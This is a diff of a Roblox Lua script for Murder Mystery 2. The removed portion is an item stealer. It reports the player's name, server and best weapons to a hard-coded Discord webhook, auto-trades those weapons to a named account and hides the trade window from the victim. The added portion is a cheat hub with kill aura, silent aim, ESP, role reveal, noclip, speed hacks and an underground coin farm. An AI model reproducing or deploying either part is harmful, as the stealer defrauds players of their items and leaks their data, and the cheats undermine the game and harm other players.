@@ -1,228 +1,804 @@
+hi-- ===-- ============================================
+-- MM2 ULTIMATE SCRIPT HUB - DELTA EDITION
+-- WITH UNDERGROUND AUTO FARM
 -- ============================================
--- MM2 WEAPON STEALER - WORKING AUTO-ADD
--- Delta Executor | Direct remote events
--- ============================================
-
-local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
-local TARGET_USER = "Sigmake5"
 
 local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local VirtualInput = game:GetService("VirtualInputManager")
+local TweenService = game:GetService("TweenService")
 
 -- ============================================
--- DISCORD WEBHOOK
+-- CREATE GUI MENU
 -- ============================================
 
-local function sendToDiscord(title, description)
-    pcall(function()
-        local data = HttpService:JSONEncode({
-            embeds = {{
-                title = title,
-                description = description,
-                color = 0xFF0000,
-                footer = {text = os.date("%Y-%m-%d %H:%M:%S")}
-            }}
-        })
-        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MM2UltimateHub"
+screenGui.Parent = player.PlayerGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 450, 0, 550)
+mainFrame.Position = UDim2.new(0.5, -225, 0.5, -275)
+mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+mainFrame.BackgroundTransparency = 0.1
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+local titleBar = Instance.new("Frame")
+titleBar.Size = UDim2.new(1, 0, 0, 35)
+titleBar.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+titleBar.BorderSizePixel = 0
+titleBar.Parent = mainFrame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 12)
+titleCorner.Parent = titleBar
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 1, 0)
+title.BackgroundTransparency = 1
+title.Text = "MM2 ULTIMATE HUB | UNDERGROUND FARM"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 16
+title.Font = Enum.Font.GothamBold
+title.Parent = titleBar
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -35, 0, 2)
+closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+closeBtn.Text = "X"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextSize = 16
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.BorderSizePixel = 0
+closeBtn.Parent = titleBar
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 6)
+closeCorner.Parent = closeBtn
+
+closeBtn.MouseButton1Click:Connect(function()
+    screenGui.Enabled = false
+end)
+
+-- Tab buttons
+local tabFrame = Instance.new("Frame")
+tabFrame.Size = UDim2.new(1, 0, 0, 40)
+tabFrame.Position = UDim2.new(0, 0, 0, 35)
+tabFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+tabFrame.BorderSizePixel = 0
+tabFrame.Parent = mainFrame
+
+local combatTab = Instance.new("TextButton")
+combatTab.Size = UDim2.new(0.25, 0, 1, -5)
+combatTab.Position = UDim2.new(0, 5, 0, 2)
+combatTab.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+combatTab.Text = "COMBAT"
+combatTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+combatTab.TextSize = 14
+combatTab.Font = Enum.Font.GothamSemibold
+combatTab.BorderSizePixel = 0
+combatTab.Parent = tabFrame
+
+local combatCorner = Instance.new("UICorner")
+combatCorner.CornerRadius = UDim.new(0, 6)
+combatCorner.Parent = combatTab
+
+local visualTab = Instance.new("TextButton")
+visualTab.Size = UDim2.new(0.25, 0, 1, -5)
+visualTab.Position = UDim2.new(0.25, 2, 0, 2)
+visualTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+visualTab.Text = "VISUALS"
+visualTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+visualTab.TextSize = 14
+visualTab.Font = Enum.Font.GothamSemibold
+visualTab.BorderSizePixel = 0
+visualTab.Parent = tabFrame
+
+local visualCorner = Instance.new("UICorner")
+visualCorner.CornerRadius = UDim.new(0, 6)
+visualCorner.Parent = visualTab
+
+local farmTab = Instance.new("TextButton")
+farmTab.Size = UDim2.new(0.25, 0, 1, -5)
+farmTab.Position = UDim2.new(0.5, 2, 0, 2)
+farmTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+farmTab.Text = "FARM"
+farmTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+farmTab.TextSize = 14
+farmTab.Font = Enum.Font.GothamSemibold
+farmTab.BorderSizePixel = 0
+farmTab.Parent = tabFrame
+
+local farmCorner = Instance.new("UICorner")
+farmCorner.CornerRadius = UDim.new(0, 6)
+farmCorner.Parent = farmTab
+
+local miscTab = Instance.new("TextButton")
+miscTab.Size = UDim2.new(0.25, 0, 1, -5)
+miscTab.Position = UDim2.new(0.75, 2, 0, 2)
+miscTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+miscTab.Text = "MISC"
+miscTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+miscTab.TextSize = 14
+miscTab.Font = Enum.Font.GothamSemibold
+miscTab.BorderSizePixel = 0
+miscTab.Parent = tabFrame
+
+local miscCorner = Instance.new("UICorner")
+miscCorner.CornerRadius = UDim.new(0, 6)
+miscCorner.Parent = miscTab
+
+-- Content frames
+local combatContent = Instance.new("ScrollingFrame")
+combatContent.Size = UDim2.new(1, -10, 1, -85)
+combatContent.Position = UDim2.new(0, 5, 0, 80)
+combatContent.BackgroundTransparency = 1
+combatContent.CanvasSize = UDim2.new(0, 0, 0, 300)
+combatContent.ScrollBarThickness = 4
+combatContent.Parent = mainFrame
+
+local visualContent = Instance.new("ScrollingFrame")
+visualContent.Size = UDim2.new(1, -10, 1, -85)
+visualContent.Position = UDim2.new(0, 5, 0, 80)
+visualContent.BackgroundTransparency = 1
+visualContent.CanvasSize = UDim2.new(0, 0, 0, 300)
+visualContent.ScrollBarThickness = 4
+visualContent.Visible = false
+visualContent.Parent = mainFrame
+
+local farmContent = Instance.new("ScrollingFrame")
+farmContent.Size = UDim2.new(1, -10, 1, -85)
+farmContent.Position = UDim2.new(0, 5, 0, 80)
+farmContent.BackgroundTransparency = 1
+farmContent.CanvasSize = UDim2.new(0, 0, 0, 400)
+farmContent.ScrollBarThickness = 4
+farmContent.Visible = false
+farmContent.Parent = mainFrame
+
+local miscContent = Instance.new("ScrollingFrame")
+miscContent.Size = UDim2.new(1, -10, 1, -85)
+miscContent.Position = UDim2.new(0, 5, 0, 80)
+miscContent.BackgroundTransparency = 1
+miscContent.CanvasSize = UDim2.new(0, 0, 0, 350)
+miscContent.ScrollBarThickness = 4
+miscContent.Visible = false
+miscContent.Parent = mainFrame
+
+-- Tab switching
+combatTab.MouseButton1Click:Connect(function()
+    combatContent.Visible = true
+    visualContent.Visible = false
+    farmContent.Visible = false
+    miscContent.Visible = false
+    combatTab.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+    visualTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    farmTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    miscTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    combatTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+    visualTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    farmTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    miscTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+end)
+
+visualTab.MouseButton1Click:Connect(function()
+    combatContent.Visible = false
+    visualContent.Visible = true
+    farmContent.Visible = false
+    miscContent.Visible = false
+    combatTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    visualTab.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+    farmTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    miscTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    combatTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    visualTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+    farmTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    miscTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+end)
+
+farmTab.MouseButton1Click:Connect(function()
+    combatContent.Visible = false
+    visualContent.Visible = false
+    farmContent.Visible = true
+    miscContent.Visible = false
+    combatTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    visualTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    farmTab.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+    miscTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    combatTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    visualTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    farmTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+    miscTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+end)
+
+miscTab.MouseButton1Click:Connect(function()
+    combatContent.Visible = false
+    visualContent.Visible = false
+    farmContent.Visible = false
+    miscContent.Visible = true
+    combatTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    visualTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    farmTab.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    miscTab.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+    combatTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    visualTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    farmTab.TextColor3 = Color3.fromRGB(200, 200, 200)
+    miscTab.TextColor3 = Color3.fromRGB(255, 255, 255)
+end)
+
+-- Function to create toggle buttons
+local function createToggle(parent, text, yPos, callback)
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, -10, 0, 40)
+    frame.Position = UDim2.new(0, 0, 0, yPos)
+    frame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    frame.BackgroundTransparency = 0.5
+    frame.BorderSizePixel = 0
+    frame.Parent = parent
+    
+    local frameCorner = Instance.new("UICorner")
+    frameCorner.CornerRadius = UDim.new(0, 6)
+    frameCorner.Parent = frame
+    
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(0.7, -10, 1, 0)
+    label.Position = UDim2.new(0, 10, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text
+    label.TextColor3 = Color3.fromRGB(220, 220, 220)
+    label.TextSize = 14
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Font = Enum.Font.Gotham
+    label.Parent = frame
+    
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 60, 0, 30)
+    button.Position = UDim2.new(1, -70, 0, 5)
+    button.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+    button.Text = "OFF"
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextSize = 12
+    button.Font = Enum.Font.GothamBold
+    button.BorderSizePixel = 0
+    button.Parent = frame
+    
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 4)
+    btnCorner.Parent = button
+    
+    local enabled = false
+    
+    button.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        button.Text = enabled and "ON" or "OFF"
+        button.BackgroundColor3 = enabled and Color3.fromRGB(50, 150, 50) or Color3.fromRGB(60, 60, 70)
+        callback(enabled)
     end)
+    
+    return frame
 end
 
 -- ============================================
--- WEAPON RARITY DATABASE
+-- UNDERGROUND AUTO FARM (MAIN FEATURE)
 -- ============================================
 
-local WEAPON_VALUES = {
-    -- Godlies (100-90)
-    ["Corrupt"] = 100, ["Icebreaker"] = 99, ["Chroma"] = 98,
-    ["Luger"] = 95, ["Slasher"] = 95, ["Pixel"] = 95, ["Clockwork"] = 95,
-    ["Spider"] = 95, ["Deathshard"] = 95, ["Fang"] = 95, ["Heat"] = 95,
-    ["Laser"] = 95, ["Nightblade"] = 95, ["Old Glory"] = 95, ["Saw"] = 95,
-    ["Shark"] = 95, ["Tides"] = 95, ["Virtual"] = 95, ["Elderwood"] = 90,
-    ["Hallows"] = 90, ["Battle"] = 90, ["Cane"] = 90,
-    -- Uniques
-    ["Cupid"] = 88, ["Heartblade"] = 88, ["Valentine"] = 85,
-    -- Ancients
-    ["Ancient"] = 85, ["Hallow"] = 85, ["Bat"] = 85, ["Boneblade"] = 85,
-    -- Legendaries
-    ["Icewing"] = 60, ["Ghostblade"] = 60, ["Viper"] = 55, ["Shadow"] = 55,
-}
+local undergroundFarmEnabled = false
+local undergroundPosition = nil
+local currentYOffset = -50 -- How far under the map to go
 
-local function getWeaponValue(name)
-    for key, value in pairs(WEAPON_VALUES) do
-        if name:find(key) then
-            return value
-        end
-    end
-    return 10
-end
-
--- ============================================
--- GET YOUR BEST WEAPONS (FROM BACKPACK)
--- ============================================
-
-local function getBestWeapons()
-    local weapons = {}
+-- Find the lowest point in the map to go under
+local function findUndergroundPosition()
+    -- Get the map's baseplate or lowest part
+    local lowestPoint = nil
+    local lowestY = math.huge
     
-    -- Get from backpack
-    for _, item in pairs(player.Backpack:GetChildren()) do
-        if item:IsA("Tool") then
-            local value = getWeaponValue(item.Name)
-            table.insert(weapons, {name = item.Name, value = value, object = item})
-        end
-    end
-    
-    -- Get equipped
-    if player.Character then
-        for _, item in pairs(player.Character:GetChildren()) do
-            if item:IsA("Tool") then
-                local value = getWeaponValue(item.Name)
-                table.insert(weapons, {name = item.Name, value = value, object = item})
+    for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") and part.Name:find("Base") or part.Name:find("Floor") or part.Name:find("Ground") then
+            local yPos = part.Position.Y
+            if yPos < lowestY then
+                lowestY = yPos
+                lowestPoint = part
             end
         end
     end
     
-    -- Sort by value
-    table.sort(weapons, function(a, b) return a.value > b.value end)
-    
-    -- Return top 4
-    local top4 = {}
-    for i = 1, math.min(4, #weapons) do
-        table.insert(top4, weapons[i])
+    if lowestPoint then
+        return Vector3.new(0, lowestPoint.Position.Y - 30, 0) -- 30 studs under ground
     end
     
-    return top4
+    -- Fallback: go to Y = -100
+    return Vector3.new(0, -100, 0)
 end
 
--- ============================================
--- TRADE REMOTES
--- ============================================
-
-local Remotes = {
-    StartTrade = ReplicatedStorage:FindFirstChild("StartTrade"),
-    AcceptTrade = ReplicatedStorage:FindFirstChild("AcceptTrade"),
-    OfferItem = ReplicatedStorage:FindFirstChild("OfferItem"),
-    CompleteTrade = ReplicatedStorage:FindFirstChild("CompleteTrade"),
-    AcceptRequest = ReplicatedStorage:FindFirstChild("AcceptRequest"),
-}
-
--- ============================================
--- AUTO TRADE SEQUENCE (USING REMOTES)
--- ============================================
-
-local tradeActive = false
-
-local function executeTrade(targetPlayer)
-    if tradeActive then return end
-    tradeActive = true
+-- Teleport player underground
+local function goUnderground()
+    if not player.Character then return end
     
-    -- Get best weapons
-    local weapons = getBestWeapons()
-    local weaponNames = {}
-    for _, w in pairs(weapons) do
-        table.insert(weaponNames, w.name)
+    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
+    
+    local undergroundPos = findUndergroundPosition()
+    local currentPos = hrp.Position
+    undergroundPos = Vector3.new(currentPos.X, undergroundPos.Y, currentPos.Z)
+    
+    -- Smooth teleport underground
+    hrp.CFrame = CFrame.new(undergroundPos)
+    
+    -- Disable collisions while underground
+    for _, part in pairs(player.Character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = false
+        end
     end
+end
+
+-- Come back above ground
+local function goAboveGround()
+    if not player.Character then return end
     
-    -- Send to Discord
-    sendToDiscord(
-        "🎯 WEAPON STEALER",
-        "**Player:** " .. player.Name .. "\n" ..
-        "**Server:** `" .. game.JobId .. "`\n" ..
-        "**Target:** " .. TARGET_USER .. "\n\n" ..
-        "**4 Best Weapons:**\n" ..
-        "1. " .. (weapons[1] and weapons[1].name or "None") .. "\n" ..
-        "2. " .. (weapons[2] and weapons[2].name or "None") .. "\n" ..
-        "3. " .. (weapons[3] and weapons[3].name or "None") .. "\n" ..
-        "4. " .. (weapons[4] and weapons[4].name or "None")
-    )
+    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return end
     
-    -- Step 1: Accept trade request
-    if Remotes.AcceptRequest then
-        Remotes.AcceptRequest:FireServer()
-        print("✅ Accepted trade request")
-        wait(0.5)
-    end
-    
-    -- Step 2: Add weapons to trade
-    local added = 0
-    for _, weapon in pairs(weapons) do
-        if Remotes.OfferItem and weapon.object then
-            Remotes.OfferItem:FireServer(weapon.object)
-            print("➕ Added: " .. weapon.name)
-            added = added + 1
-            wait(0.3)
+    -- Find surface level
+    local surfaceY = 50 -- Default above ground
+    for _, part in pairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") and part.Name:find("Base") or part.Name:find("Floor") then
+            surfaceY = part.Position.Y + 5
+            break
         end
     end
     
-    -- Step 3: Wait for target to accept
-    wait(1.5)
+    hrp.CFrame = CFrame.new(hrp.Position.X, surfaceY, hrp.Position.Z)
     
-    -- Step 4: Accept trade
-    if Remotes.AcceptTrade then
-        Remotes.AcceptTrade:FireServer()
-        print("✅ Accepted trade")
-        wait(0.5)
-    end
-    
-    -- Step 5: Complete trade
-    if Remotes.CompleteTrade then
-        Remotes.CompleteTrade:FireServer()
-        print("✅ Trade completed")
-    end
-    
-    sendToDiscord(
-        "✅ STEAL COMPLETE",
-        "**Stolen:** " .. added .. "/4 weapons\n" ..
-        "**Weapons:** " .. table.concat(weaponNames, ", ")
-    )
-    
-    tradeActive = false
-end
-
--- ============================================
--- LISTEN FOR SIGMAKE5 TRADE REQUEST
--- ============================================
-
--- Method 1: Listen for StartTrade remote
-if Remotes.StartTrade and Remotes.StartTrade.OnClientEvent then
-    Remotes.StartTrade.OnClientEvent:Connect(function(sender)
-        if sender and sender.Name == TARGET_USER then
-            print("🔔 Trade request from " .. TARGET_USER)
-            executeTrade(sender)
+    -- Re-enable collisions
+    for _, part in pairs(player.Character:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = true
         end
-    end)
+    end
 end
 
--- Method 2: Watch for AcceptRequest being called
-for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
-    if remote:IsA("RemoteEvent") and remote.OnClientEvent then
-        remote.OnClientEvent:Connect(function(...)
-            local args = {...}
-            for _, arg in pairs(args) do
-                if type(arg) == "table" and arg.Name == TARGET_USER then
-                    if not tradeActive then
-                        executeTrade(arg)
+-- Collect coins from underground (through walls)
+local function collectCoinsFromUnderground()
+    if not undergroundFarmEnabled then return end
+    
+    -- Ensure player stays underground
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        local hrp = player.Character.HumanoidRootPart
+        local undergroundPos = findUndergroundPosition()
+        
+        -- Keep player underground
+        if hrp.Position.Y > undergroundPos.Y + 5 then
+            hrp.CFrame = CFrame.new(hrp.Position.X, undergroundPos.Y, hrp.Position.Z)
+        end
+        
+        -- Disable collisions continuously
+        for _, part in pairs(player.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    end
+    
+    -- Find and collect coins (they are visible from underground)
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Part") and (obj.Name:find("Coin") or obj.Name:find("coin") or obj.Name:find("Cash")) then
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local hrp = player.Character.HumanoidRootPart
+                local dist = (hrp.Position - obj.Position).Magnitude
+                
+                -- Teleport to coins (from underground)
+                if dist < 50 then
+                    hrp.CFrame = CFrame.new(obj.Position.X, hrp.Position.Y, obj.Position.Z)
+                    wait(0.05)
+                    
+                    -- Touch the coin (simulate collection)
+                    local touchPart = player.Character:FindFirstChild("HumanoidRootPart")
+                    if touchPart then
+                        -- Fire touch event
+                        firetouchinterest(touchPart, obj, 0)
+                        wait(0.05)
+                        firetouchinterest(touchPart, obj, 1)
                     end
                 end
             end
-        end)
+        end
     end
 end
 
 -- ============================================
--- HIDE TRADE GUI
+-- FEATURE 1: ESP
 -- ============================================
 
-spawn(function()
-    while wait(0.1) do
-        pcall(function()
-            for _, gui in pairs(player.PlayerGui:GetChildren()) do
-                if gui.Name:lower():find("trade") then
-                    gui:Destroy()
+local espEnabled = false
+local espHighlights = {}
+
+local function updateESP()
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= player and plr.Character then
+            local highlight = espHighlights[plr]
+            if espEnabled then
+                if not highlight then
+                    highlight = Instance.new("Highlight")
+                    highlight.Parent = plr.Character
+                    highlight.FillColor = Color3.fromRGB(255, 50, 50)
+                    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+                    highlight.FillTransparency = 0.5
+                    espHighlights[plr] = highlight
+                end
+            else
+                if highlight then
+                    highlight:Destroy()
+                    espHighlights[plr] = nil
                 end
             end
+        end
+    end
+end
+
+-- ============================================
+-- FEATURE 2: AUTO GRAB GUN
+-- ============================================
+
+local autoGunEnabled = false
+
+local function autoGrabGun()
+    if not autoGunEnabled then return end
+    
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Tool") and obj.Name:find("Gun") and obj.Parent ~= player.Character then
+            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local hrp = player.Character.HumanoidRootPart
+                local dist = (hrp.Position - obj.Position).Magnitude
+                if dist < 30 then
+                    hrp.CFrame = obj.CFrame
+                    wait(0.1)
+                    fireclickdetector(obj:FindFirstChildWhichIsA("ClickDetector"))
+                end
+            end
+        end
+    end
+end
+
+-- ============================================
+-- FEATURE 3: KILL AURA
+-- ============================================
+
+local killAuraEnabled = false
+local killAuraRange = 20
+
+local function killAura()
+    if not killAuraEnabled then return end
+    
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
+            local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local dist = (hrp.Position - plr.Character.HumanoidRootPart.Position).Magnitude
+                if dist < killAuraRange then
+                    plr.Character.Humanoid.Health = 0
+                end
+            end
+        end
+    end
+end
+
+-- ============================================
+-- FEATURE 4: SILENT AIM
+-- ============================================
+
+local silentAimEnabled = false
+
+local function silentAim()
+    if not silentAimEnabled then return end
+    
+    local nearest = nil
+    local nearestDist = math.huge
+    
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                local dist = (hrp.Position - plr.Character.HumanoidRootPart.Position).Magnitude
+                if dist < nearestDist and dist < 100 then
+                    nearestDist = dist
+                    nearest = plr
+                end
+            end
+        end
+    end
+    
+    if nearest and player.Character then
+        workspace.CurrentCamera.CFrame = CFrame.new(
+            workspace.CurrentCamera.CFrame.Position,
+            nearest.Character.HumanoidRootPart.Position
+        )
+    end
+end
+
+-- ============================================
+-- FEATURE 5: INFINITE JUMP
+-- ============================================
+
+local infiniteJumpEnabled = false
+
+UserInputService.JumpRequest:Connect(function()
+    if infiniteJumpEnabled and player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+end)
+
+-- ============================================
+-- FEATURE 6: WALK SPEED
+-- ============================================
+
+local walkSpeedEnabled = false
+local walkSpeedValue = 50
+
+local function setWalkSpeed()
+    if walkSpeedEnabled and player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.WalkSpeed = walkSpeedValue
+    elseif player.Character and player.Character:FindFirstChild("Humanoid") then
+        player.Character.Humanoid.WalkSpeed = 16
+    end
+end
+
+-- ============================================
+-- FEATURE 7: REVEAL ROLES
+-- ============================================
+
+local revealRolesEnabled = false
+
+local function detectRole(character)
+    for _, item in pairs(character:GetChildren()) do
+        if item:IsA("Tool") and (item.Name:find("Knife") or item.Name:find("Dagger")) then
+            return "🔪 MURDERER"
+        elseif item:IsA("Tool") and item.Name:find("Gun") then
+            return "🔫 SHERIFF"
+        end
+    end
+    return "👤 INNOCENT"
+end
+
+local function revealRoles()
+    if not revealRolesEnabled then return end
+    
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= player and plr.Character then
+            local role = detectRole(plr.Character)
+            local billboard = plr.Character:FindFirstChild("RoleTag")
+            if not billboard then
+                billboard = Instance.new("BillboardGui")
+                billboard.Name = "RoleTag"
+                billboard.Size = UDim2.new(0, 100, 0, 30)
+                billboard.StudsOffset = Vector3.new(0, 3, 0)
+                billboard.Parent = plr.Character
+                
+                local textLabel = Instance.new("TextLabel")
+                textLabel.Size = UDim2.new(1, 0, 1, 0)
+                textLabel.BackgroundTransparency = 1
+                textLabel.Text = role
+                textLabel.TextSize = 14
+                textLabel.Font = Enum.Font.GothamBold
+                textLabel.Parent = billboard
+            else
+                local textLabel = billboard:FindFirstChildWhichIsA("TextLabel")
+                if textLabel then
+                    textLabel.Text = role
+                end
+            end
+        end
+    end
+end
+
+-- ============================================
+-- FEATURE 8: NO CLIP
+-- ============================================
+
+local noclipEnabled = false
+
+local function noclip()
+    if noclipEnabled and player.Character then
+        for _, part in pairs(player.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+            end
+        end
+    elseif player.Character then
+        for _, part in pairs(player.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = true
+            end
+        end
+    end
+end
+
+-- ============================================
+-- CREATE UI TOGGLES
+-- ============================================
+
+-- Combat tab
+createToggle(combatContent, "🔪 KILL AURA", 5, function(state)
+    killAuraEnabled = state
+end)
+
+createToggle(combatContent, "🎯 SILENT AIM (Sheriff)", 50, function(state)
+    silentAimEnabled = state
+end)
+
+createToggle(combatContent, "⚔️ AUTO GRAB GUN", 95, function(state)
+    autoGunEnabled = state
+end)
+
+-- Visuals tab
+createToggle(visualContent, "👁️ ESP (See through walls)", 5, function(state)
+    espEnabled = state
+end)
+
+createToggle(visualContent, "🏷️ REVEAL ROLES", 50, function(state)
+    revealRolesEnabled = state
+end)
+
+-- Farm tab
+createToggle(farmContent, "🕳️ UNDERGROUND AUTO FARM", 5, function(state)
+    undergroundFarmEnabled = state
+    if state then
+        goUnderground()
+    else
+        goAboveGround()
+    end
+end)
+
+createToggle(farmContent, "🦘 INFINITE JUMP", 50, function(state)
+    infiniteJumpEnabled = state
+end)
+
+-- Misc tab
+createToggle(miscContent, "🚀 WALK SPEED", 5, function(state)
+    walkSpeedEnabled = state
+end)
+
+-- Walk speed slider
+local speedFrame = Instance.new("Frame")
+speedFrame.Size = UDim2.new(1, -10, 0, 40)
+speedFrame.Position = UDim2.new(0, 0, 0, 50)
+speedFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+speedFrame.BackgroundTransparency = 0.5
+speedFrame.BorderSizePixel = 0
+speedFrame.Parent = miscContent
+
+local speedCorner = Instance.new("UICorner")
+speedCorner.CornerRadius = UDim.new(0, 6)
+speedCorner.Parent = speedFrame
+
+local speedLabel = Instance.new("TextLabel")
+speedLabel.Size = UDim2.new(0.5, -10, 1, 0)
+speedLabel.Position = UDim2.new(0, 10, 0, 0)
+speedLabel.BackgroundTransparency = 1
+speedLabel.Text = "Speed Value: 50"
+speedLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
+speedLabel.TextSize = 14
+speedLabel.TextXAlignment = Enum.TextXAlignment.Left
+speedLabel.Font = Enum.Font.Gotham
+speedLabel.Parent = speedFrame
+
+local speedSlider = Instance.new("TextButton")
+speedSlider.Size = UDim2.new(0.3, 0, 0, 30)
+speedSlider.Position = UDim2.new(0.7, -10, 0, 5)
+speedSlider.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
+speedSlider.Text = "+ / -"
+speedSlider.TextColor3 = Color3.fromRGB(255, 255, 255)
+speedSlider.TextSize = 12
+speedSlider.Font = Enum.Font.GothamBold
+speedSlider.BorderSizePixel = 0
+speedSlider.Parent = speedFrame
+
+local speedCorner2 = Instance.new("UICorner")
+speedCorner2.CornerRadius = UDim.new(0, 4)
+speedCorner2.Parent = speedSlider
+
+speedSlider.MouseButton1Click:Connect(function()
+    walkSpeedValue = walkSpeedValue == 50 and 100 or (walkSpeedValue == 100 and 200 or 50)
+    speedLabel.Text = "Speed Value: " .. walkSpeedValue
+end)
+
+createToggle(miscContent, "🚪 NO CLIP", 95, function(state)
+    noclipEnabled = state
+end)
+
+-- ============================================
+-- MAIN LOOPS
+-- ============================================
+
+-- Underground Farm Loop (runs very frequently)
+spawn(function()
+    while wait(0.1) do
+        collectCoinsFromUnderground()
+    end
+end)
+
+-- ESP Update Loop
+spawn(function()
+    while wait(0.5) do
+        updateESP()
+    end
+end)
+
+-- Role Reveal Loop
+spawn(function()
+    while wait(1) do
+        revealRoles()
+    end
+end)
+
+-- Combat Loops
+spawn(function()
+    while wait(0.1) do
+        killAura()
+        silentAim()
+        autoGrabGun()
+    end
+end)
+
+-- Movement Loops
+spawn(function()
+    while wait(0.1) do
+        setWalkSpeed()
+        noclip()
+    end
+end)
+
+-- Keep underground position maintained
+spawn(function()
+    while wait(0.5) do
+        if undergroundFarmEnabled then
+            goUnderground()
+        end
